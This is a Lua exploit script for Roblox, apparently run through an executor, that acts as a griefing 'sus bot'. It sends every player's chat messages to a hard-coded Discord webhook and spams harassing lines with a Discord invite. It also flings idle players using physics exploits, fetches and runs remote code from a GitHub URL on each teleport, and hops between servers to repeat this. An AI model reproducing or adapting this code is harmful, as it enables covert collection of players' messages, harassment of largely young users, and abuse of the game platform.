do
    local http = game:GetService("HttpService")

    function log(name, msg)
        local Data = {
            ["username"] = name;
            ["content"] = msg;
        }
        
        local res = syn.request({
            Url = "https://discord.com/api/webhooks/817508368318595112/YDuVLNwUEaAtByU1qiuHyXHgD07wKocMo8DA8uKmnSBHQEmoR0rY_rq4Kfk4gXBhXDf4";
            Method = "POST";
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = http:JSONEncode(Data);
        })
    end

    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering").OnClientEvent:Connect(function(msg)
        if msg.Message == "ALL HAIL Reswitching x XZYSWATTEDYOU MIC UP ILL VIOLATE U xzy3510" then return end
        if msg.FromSpeaker == game.Players.LocalPlayer.Name then
            log("AMONG US BOT ["..game.Players.LocalPlayer.Name.."]", msg.Message)
        else
            log(msg.FromSpeaker, msg.Message)
        end
    end)
end

if not game.IsLoaded then
    game.Loaded:Wait()
end

repeat wait(0) until game.Players.LocalPlayer

if not game.Players.LocalPlayer.Character then
    game.Players.LocalPlayer.CharacterAdded:Wait()
end

function newchar()
    local human = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
    human:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    human:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)

    wait(1)
    spawn(function()
        local radio = game.Players.LocalPlayer.Backpack:WaitForChild("BoomBox", 10)
        if radio then
            radio.Handle.Massless = true
            radio.Parent = game.Players.LocalPlayer.Character
            wait()
            radio:WaitForChild("Remote"):FireServer("PlaySong", 6187959469)
        end
    end)

    game.Players.LocalPlayer.Character:WaitForChild("Animate").Disabled = true
    for i,v in pairs(human:GetPlayingAnimationTracks()) do
        v:Stop()
    end
end

newchar()
game.Players.LocalPlayer.CharacterAdded:Connect(newchar)

game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("SUP NERDS? 😳 SUS IMPOSTOR BOT HAS ARRIVED 😎", "All")
local texts = {
    "😳 AMOGUS!";
    "😳 RED SUS";
    "😳 LOOKIN REAL SUSSY";
    "😳 AIRPOD SHOTTY";
    "😳 OOPSIE!";
    "😳 YOURE ACTING SUS IM VOTING YOU OUT!";
    "😳 WHEN THE IMPOSTOR IS SUS";
    "😳 YOU HAVE BEEN EJECTED FROM THE SKELD";
    "😳 GET TROLLED TROLOLOLOLOL";
    "😳 U MAD? MIC UP! INVITE: 6vZXAAkJQj";
    "😳 MAD YOU CANT PLAY YOUR AWFUL MUSIC? MIC UP. INVITE: 6vZXAAkJQj";
    "😳 BORED? COME JOIN. INVITE: 6vZXAAkJQj";
    "😳 SUP KIDS. COME JOIN. INVITE: 6vZXAAkJQj";
    "😳 FENNEC SIMPLY CANNOT COMPARE!";
    "😳 U MAD? GOT EJECTED? MIC UP BRO: 6vZXAAkJQj";
    "😳 MY MAN REAL MAD BRO, MIC UP: 6vZXAAkJQj";
    "😳 GET EJECTED SUSSY BRO!";
    "😳 GOT A SUSSY PROBLEM BRO? HERE'S THERAPY: 6vZXAAkJQj";
    "😳 SORRY, SUS BOT DOESN'T ACCEPT AWFUL MUSIC!";
    "😳 SUSSY!";
}

spawn(function()
    while true do
        game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(texts[math.random(#texts)], "All")
        wait(5)
    end
end)

spawn(function()
    game:GetService('RunService').Stepped:connect(function()
        game.Players.LocalPlayer.Character.Head.CanCollide = false
        game.Players.LocalPlayer.Character.Torso.CanCollide = false
        game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
        game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
    end)

    function antiSit()
        if game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then 
            game.Players.LocalPlayer.Character.Humanoid.Jump = true
        end
    end
    game:GetService("RunService"):BindToRenderStep("antiSit", 1000, antiSit)

    while true do
        pcall(function()
            if game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyThrust") then
                game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyThrust"):Destroy()
            end
            
            game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0,0,0)
            game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyAngularVelocity = Vector3.new(0,0,0)
            wait(.1)
            local ok = {}
            for i,v in pairs(game.Players:GetPlayers()) do
                if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("HumanoidRootPart") and v.Character.Humanoid.Sit == false and v.Character.Humanoid.MoveDirection.Magnitude <= 0 and v.Character.HumanoidRootPart.AssemblyLinearVelocity.Magnitude <= .1 then
                    table.insert(ok, v.Character)
                end
            end
            local target = ok[math.random(#ok)]
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.HumanoidRootPart.Position)
            local bambam = Instance.new("BodyThrust")
            bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
            bambam.Force = Vector3.new(1000,0,1000)
            bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
        end)
        wait(1)
    end
end)

wait(5 * #game.Players:GetPlayers())

game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("😳 U MAD? MIC UP! INVITE: 6vZXAAkJQj", "All")

syn.queue_on_teleport(syn.request({Url = "https://raw.githubusercontent.com/qtosch/SusBot/main/susbot.lua?cacheId=" .. game.HttpService:GenerateGUID()}).Body)

id = game.PlaceId

function findservers()
    local all = {}
    local cursor = ""
    while cursor do
        local servers = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..id.."/servers/Public?cursor="..cursor))
        for _,v in pairs(servers.data) do
            if v.playing < v.maxPlayers then
                table.insert(all, v.id)
            end
        end
        cursor = servers.nextPageCursor
    end
    return all
end

while true do
    local ok, err = pcall(function()
        local servers = findservers()
        local jobid = servers[math.random(#servers)]
        log("AMONG US BOT ["..game.Players.LocalPlayer.Name.."]", "MOVING TO SERVER: "..jobid)
        game:GetService("TeleportService"):TeleportToPlaceInstance(id, jobid)
    end)
    if not ok then warn(err) end
    wait(10)
end